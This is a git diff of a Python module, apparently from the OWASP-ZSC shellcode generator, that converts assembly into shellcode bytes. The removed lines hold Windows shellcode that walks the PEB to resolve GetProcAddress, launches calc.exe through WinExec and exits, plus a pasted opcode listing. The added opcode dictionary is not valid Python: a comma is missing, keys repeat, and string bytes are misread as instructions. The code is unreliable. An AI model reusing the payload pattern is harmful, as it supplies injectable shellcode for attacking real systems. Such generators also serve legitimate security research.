@@ -6,71 +6,71 @@ https://github.com/zscproject/OWASP-ZSC
 http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
 '''
-
-import sys
-sys.path.insert(0, 'C:\\Users\\Nikhil\Desktop\\vagrant\\OWASP-ZSC')
-# import core
 import binascii
 from core import stack
 from core import color
 from core.alert import info
 from core.compatible import version
 _version = version()
-replace_values_static = 
-	{
-	'push rbx':'53',
-	'push rdi' :'57',
-
-
-  /* 0001 */ "\x56"                         /* push rsi                        */
-  /* 0002 */ "\x57"                         /* push rdi                        */
-  /* 0003 */ "\x55"                         /* push rbp                        */
-  /* 0004 */ "\x83\xec\x28"                 /* sub esp, 0x28                   */
-  /* 0007 */ "\x31\xc0"                     /* xor eax, eax                    */
-  /* 0009 */ "\x40\x92"                     /* xchg edx, eax                   */
-  /* 000B */ "\x74\x19"                     /* jz 0x26                         */
-  /* 000D */ "\x8b\x4c\x24\x3c"             /* mov ecx, [rsp+0x3c]             */
-  /* 0011 */ "\x51"                         /* push rcx                        */
-  /* 0012 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:rdx+0x2f]          */
-  /* 0016 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
-  /* 0019 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
-  /* 001C */ "\xad"                         /* lodsd                           */
-  /* 001D */ "\x8b\x30"                     /* mov esi, [rax]                  */
-  /* 001F */ "\x8b\x7e\x18"                 /* mov edi, [rsi+0x18]             */
-  /* 0022 */ "\xb2\x50"                     /* mov dl, 0x50                    */
-  /* 0024 */ "\xeb\x17"                     /* jmp 0x3d                        */
-  /* 0026 */ "\xb2\x60"                     /* mov dl, 0x60                    */
-  /* 0028 */ "\x65\x48\x8b\x32"             /* mov rsi, [gs:rdx]               */
-  /* 002C */ "\x48\x8b\x76\x18"             /* mov rsi, [rsi+0x18]             */
-  /* 0030 */ "\x48\x8b\x76\x10"             /* mov rsi, [rsi+0x10]             */
-  /* 0034 */ "\x48\xad"                     /* lodsq                           */
-  /* 0036 */ "\x48\x8b\x30"                 /* mov rsi, [rax]                  */
-  /* 0039 */ "\x48\x8b\x7e\x30"             /* mov rdi, [rsi+0x30]             */
-  /* 003D */ "\x03\x57\x3c"                 /* add edx, [rdi+0x3c]             */
-  /* 0040 */ "\x8b\x5c\x17\x28"             /* mov ebx, [rdi+rdx+0x28]         */
-  /* 0044 */ "\x8b\x74\x1f\x20"             /* mov esi, [rdi+rbx+0x20]         */
-  /* 0048 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
-  /* 004B */ "\x8b\x54\x1f\x24"             /* mov edx, [rdi+rbx+0x24]         */
-  /* 004F */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [rdi+rdx]       */
-  /* 0053 */ "\x48\x8d\x52\x02"             /* lea rdx, [rdx+0x2]              */
-  /* 0057 */ "\xad"                         /* lodsd                           */
-  /* 0058 */ "\x81\x3c\x07\x4c\x6f\x61\x64" /* cmp dword [rdi+rax], 0x64616f4c */
-  /* 005F */ "\x75\xee"                     /* jnz 0x4f                        */
-  /* 0061 */ "\x80\x7c\x07\x0b\x41"         /* cmp byte [rdi+rax+0xb], 0x41    */
-  /* 0066 */ "\x75\xe7"                     /* jnz 0x4f                        */
-  /* 0068 */ "\x8b\x74\x1f\x1c"             /* mov esi, [rdi+rbx+0x1c]         */
-  /* 006C */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
-  /* 006F */ "\x8b\x34\xae"                 /* mov esi, [rsi+rbp*4]            */
-  /* 0072 */ "\x48\x01\xf7"                 /* add rdi, rsi                    */
-  /* 0075 */ "\xff\xd7"                     /* call rdi                        */
-  /* 0077 */ "\x48\x83\xc4\x28"             /* add rsp, 0x28                   */
-  /* 007B */ "\x5d"                         /* pop rbp                         */
-  /* 007C */ "\x5f"                         /* pop rdi                         */
-  /* 007D */ "\x5e"                         /* pop rsi                         */
-  /* 007E */ "\x5b"                         /* pop rbx                         */
-  /* 007F */ "\xc3"                         /* ret                             */
-}
-
+replace_values_static = {"48 83 ec 20         " :   "sub    $0x20,%rsp"
+  "48 83 e4 f0         " :   "and    $0xfffffffffffffff0,%rsp"
+  ,"65 4c 8b 24 25 60 00" :   "mov    %gs:0x60,%r12"
+  ,"4d 8b 64 24 18      " :   "mov    0x18(%r12),%r12"
+  ,"4d 8b 64 24 20      " :   "mov    0x20(%r12),%r12"
+  ,"4d 8b 24 24         " :   "mov    (%r12),%r12"
+  ,"4d 8b 7c 24 20      " :   "mov    0x20(%r12),%r15"
+  ,"4d 8b 24 24         " :   "mov    (%r12),%r12"
+  ,"4d 8b 64 24 20      " :   "mov    0x20(%r12),%r12"
+  ,"ba 98 fe 8a 0e      " :   "mov    $0xe8afe98,%edx"
+  ,"4c 89 e1            " :   "mov    %r12,%rcx"
+  ,"4d 89 e4            " :   "mov    %r12,%r12"
+  ,"e8 2a 00 00 00      " :   "callq  0x401067"
+  ,"eb 1a               " :   "jmp    0x401059"
+  ,"59                  " :   "pop    %rcx"
+  ,"ba 01 00 00 00      " :   "mov    $0x1,%edx"
+  ,"ff d0               " :   "callq  *%rax"
+  ,"ba 70 cd 3f 2d      " :   "mov    $0x2d3fcd70,%edx"
+  ,"4c 89 f9            " :   "mov    %r15,%rcx"
+  ,"e8 13 00 00 00      " :   "callq  0x401067"
+  ,"48 31 c9            " :   "xor    %rcx,%rcx"
+  ,"ff d0               " :   "callq  *%rax"
+  ,"e8 e1 ff ff ff      " :   "callq  0x40103f"
+  ,"63 61 6c            " :   "movslq 0x6c(%rcx),%esp"
+  ,"63 2e               " :   "movslq (%rsi),%ebp"
+  ,"65 78 65            " :   "gs js  0x4010cb"
+  ,"00 49 89            " :   "add    %cl,-0x77(%rcx)"
+  ,"cd 67               " :   "int    $0x67"
+  ,"41 8b 45 3c         " :   "mov    0x3c(%r13),%eax"
+  ,"67 45 8b b4 05 88 00" :   "mov    0x88(%r13d,%eax,1),%r14d"
+  ,"45 01 ee            " :   "add    %r13d,%r14d"
+  ,"67 45 8b 56 18      " :   "mov    0x18(%r14d),%r10d"
+  ,"67 41 8b 5e 20      " :   "mov    0x20(%r14d),%ebx"
+  ,"44 01 eb            " :   "add    %r13d,%ebx"
+  ,"67 e3 3f            " :   "jecxz  0x4010ca"
+  ,"41 ff ca            " :   "dec    %r10d"
+  ,"67 42 8b 34 93      " :   "mov    (%ebx,%r10d,4),%esi"
+  ,"44 01 ee            " :   "add    %r13d,%esi"
+  ,"31 ff               " :   "xor    %edi,%edi"
+  ,"31 c0               " :   "xor    %eax,%eax"
+  ,"fc                  " :   "cld"
+  ,"ac                  " :   "lods   %ds:(%rsi),%al"
+  ,"84 c0               " :   "test   %al,%al"
+  ,"74 07               " :   "je     0x4010a7"
+  ,"c1 cf 0d            " :   "ror    $0xd,%edi"
+  ,"01 c7               " :   "add    %eax,%edi"
+  ,"eb f4               " :   "jmp    0x40109b"
+  ,"39 d7               " :   "cmp    %edx,%edi"
+  ,"75 dd               " :   "jne    0x401088"
+  ,"67 41 8b 5e 24      " :   "mov    0x24(%r14d),%ebx"
+  ,"44 01 eb            " :   "add    %r13d,%ebx"
+  ,"31 c9               " :   "xor    %ecx,%ecx"
+  ,"66 67 42 8b 0c 53   " :   "mov    (%ebx,%r10d,2),%cx"
+  ,"67 41 8b 5e 1c      " :   "mov    0x1c(%r14d),%ebx"
+  ,"44 01 eb            " :   "add    %r13d,%ebx"
+  ,"67 8b 04 8b         " :   "mov    (%ebx,%ecx,4),%eax"
+  ,"44 01 e8            " :   "add    %r13d,%eax"
+  ,"c3                  " :   "retq",
+  }
 
 
 def convert(shellcode):
@@ -79,7 +79,6 @@ def convert(shellcode):
 		shellcode = shellcode.replace(data,replace_values_static[data])
 
 	new_shellcode = shellcode.rsplit('\n')
-	# return new_shellcode
 	last = 0
 	for line in new_shellcode:
 		if 'push $0x' in line:
@@ -166,82 +165,6 @@ def convert(shellcode):
 			rep = str('75') + hex(int('f4', 16) - last*9)[2:]
 			shellcode = shellcode.replace(line,rep,1)
 			last += 1
-	# this line basically adds \x before all the shellcodes. 
 	shellcode = stack.shellcoder(shellcode.replace('\n','').replace(' ',''))
 	return shellcode
 
-assembly = '''xor    %ecx,%ecx
-mov    %fs:0x30(%ecx),%eax
-mov    0xc(%eax),%eax
-mov    0x14(%eax),%esi
-lods   %ds:(%esi),%eax
-xchg   %eax,%esi
-lods   %ds:(%esi),%eax
-mov    0x10(%eax),%ebx
-mov    0x3c(%ebx),%edx
-add    %ebx,%edx
-mov    0x78(%edx),%edx
-add    %ebx,%edx
-mov    0x20(%edx),%esi
-add    %ebx,%esi
-xor    %ecx,%ecx
-inc    %ecx
-lods   %ds:(%esi),%eax
-add    %ebx,%eax
-cmpl   $0x50746547,(%eax)
-jne    23 <.text+0x23>
-cmpl   $0x41636f72,0x4(%eax)
-jne    23 <.text+0x23>
-cmpl   $0x65726464,0x8(%eax)
-jne    23 <.text+0x23>
-mov    0x24(%edx),%esi
-add    %ebx,%esi
-mov    (%esi,%ecx,2),%cx
-dec    %ecx
-mov    0x1c(%edx),%esi
-add    %ebx,%esi
-mov    (%esi,%ecx,4),%edx
-add    %ebx,%edx
-push   %ebx
-push   %edx
-xor    %ecx,%ecx
-push   %ecx
-mov    $0x61636578,%ecx
-push   %ecx
-subl   $0x61,0x3(%esp)
-push   $0x456e6957
-push   %esp
-push   %ebx
-call   *%edx
-add    $0x8,%esp
-pop    %ecx
-push   %eax
-xor    %ecx,%ecx
-push   %ecx
-push $0x6578652e
-push $0x636c6163
-
-xor    %ebx,%ebx
-mov    %esp,%ebx
-xor    %ecx,%ecx
-inc    %ecx
-push   %ecx
-push   %ebx
-call   *%eax
-add    $0x10,%esp
-pop    %edx
-pop    %ebx
-xor    %ecx,%ecx
-mov    $0x61737365,%ecx
-push   %ecx
-subl   $0x61,0x3(%esp)
-push   $0x636f7250
-push   $0x74697845
-push   %esp
-push   %ebx
-call   *%edx
-xor    %ecx,%ecx
-push   %ecx
-call   *%eax
-'''
-print(convert(assembly))
